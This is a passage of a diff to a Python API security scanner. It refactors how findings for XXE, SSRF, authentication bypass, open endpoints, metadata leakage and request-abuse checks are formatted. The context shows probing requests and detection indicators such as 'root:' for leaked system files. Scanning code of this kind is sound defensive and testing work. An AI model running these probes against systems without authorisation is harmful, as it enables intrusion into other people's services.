                         # Check if all requests succeeded (potential abuse)
                         successful = [r for r in responses if r.status_code == 200]
                         if len(successful) >= 4:  # 80% success rate
-                            micro_vulns.append(f"MICRO_TRANSACTION_ABUSE: {payload} | {len(successful)}/5 rapid requests succeeded")
+                            vuln_msg = format_vulnerability_message("MICRO_TRANSACTION_ABUSE", f"MICRO_TRANSACTION_ABUSE: {payload} | {len(successful)}/5 rapid requests succeeded")
+                            micro_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -929,7 +1221,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         
                         # Check if all requests succeeded (lack of idempotency)
                         if len(responses) >= 2 and all(r.status_code == 200 for r in responses):
-                            idempotency_vulns.append(f"IDEMPOTENCY_FAILURE: {payload} | Duplicate requests all succeeded")
+                            vuln_msg = format_vulnerability_message("IDEMPOTENCY_FAILURE", f"IDEMPOTENCY_FAILURE: {payload} | Duplicate requests all succeeded")
+                            idempotency_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -962,7 +1255,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                             ]
                             
                             if any(indicator in test_resp.text.lower() for indicator in verbose_indicators):
-                                verbose_vulns.append(f"VERBOSE_ERROR: {payload} | Detailed error information exposed")
+                                vuln_msg = format_vulnerability_message("VERBOSE_ERROR", f"VERBOSE_ERROR: {payload} | Detailed error information exposed")
+                                verbose_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -985,13 +1279,15 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                     ]
                     
                     if any(indicator in resp.text.lower() for indicator in metadata_indicators):
-                        metadata_vulns.append("METADATA_LEAKAGE: Sensitive metadata exposed in response")
+                        vuln_msg = format_vulnerability_message("METADATA_LEAKAGE", "METADATA_LEAKAGE: Sensitive metadata exposed in response")
+                        metadata_vulns.append(vuln_msg)
                     
                     # Check headers for metadata
                     sensitive_headers = ['server', 'x-powered-by', 'x-aspnet-version', 'x-runtime']
                     for header in sensitive_headers:
                         if header in resp.headers:
-                            metadata_vulns.append(f"METADATA_LEAKAGE: {header} header exposed")
+                            vuln_msg = format_vulnerability_message("METADATA_LEAKAGE", f"METADATA_LEAKAGE: {header} header exposed")
+                            metadata_vulns.append(vuln_msg)
                     
                 except Exception as e:
                     pass
@@ -1013,7 +1309,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         test_resp = req_func(test_url, headers=headers)
                         
                         if test_resp and test_resp.status_code in [200, 201]:
-                            open_endpoint_vulns.append(f"OPEN_ENDPOINT: {endpoint} | Endpoint accessible without authentication")
+                            vuln_msg = format_vulnerability_message("OPEN_ENDPOINT", f"OPEN_ENDPOINT: {endpoint} | Endpoint accessible without authentication")
+                            open_endpoint_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -1039,7 +1336,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         test_resp = req_func(api_url, headers=headers_with_xml, data=payload)
                         
                         if test_resp and ('root:' in test_resp.text or 'windows' in test_resp.text.lower()):
-                            xxe_vulns.append(f"XXE_VULNERABILITY: {payload[:50]}... | XML External Entity injection detected")
+                            vuln_msg = format_vulnerability_message("XXE_VULNERABILITY", f"XXE_VULNERABILITY: {payload[:50]}... | XML External Entity injection detected")
+                            xxe_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -1067,7 +1365,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         ssrf_resp = req_func(test_url, headers=headers)
                         
                         if ssrf_resp and ('ssh' in ssrf_resp.text.lower() or 'mysql' in ssrf_resp.text.lower() or 'aws' in ssrf_resp.text.lower()):
-                            ssrf_vulns.append(f"SSRF_VULNERABILITY: {payload} | Server-Side Request Forgery detected")
+                            vuln_msg = format_vulnerability_message("SSRF_VULNERABILITY", f"SSRF_VULNERABILITY: {payload} | Server-Side Request Forgery detected")
+                            ssrf_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -1101,7 +1400,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         test_resp = req_func(api_url, headers=headers_with_auth)
                         
                         if test_resp and test_resp.status_code == 200:
-                            auth_bypass_vulns.append(f"AUTH_BYPASS: {payload} | Authentication bypass successful")
+                            vuln_msg = format_vulnerability_message("AUTH_BYPASS", f"AUTH_BYPASS: {payload} | Authentication bypass successful")
+                            auth_bypass_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
